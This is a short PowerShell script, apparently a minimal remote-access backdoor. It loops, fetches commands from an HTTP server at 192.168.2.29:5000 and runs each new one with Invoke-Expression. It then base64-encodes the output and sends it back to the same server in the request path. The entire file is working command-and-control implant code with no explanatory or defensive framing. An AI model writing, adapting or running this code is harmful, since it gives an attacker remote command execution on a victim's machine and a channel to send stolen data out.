while ($true) {
    $command = Invoke-WebRequest -Uri "http://192.168.2.29:5000/command"
    if ($command.Content -ne $previousCommand) {
         $previousCommand = $command.Content
         $stdout = Invoke-Expression $command
         write-host $stdout
         $stdout = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($stdout))
         $stdout_url = "http://192.168.2.29:5000/stdout/"
         $stdout_combined=$stdout_url+$stdout
        Invoke-WebRequest $stdout_combined
        Start-Sleep -Seconds 2 # Wait for 2 seconds before running the loop again
    } else {
        Start-Sleep -Seconds 2 # Wait for 2 seconds before running the loop again
    }
}
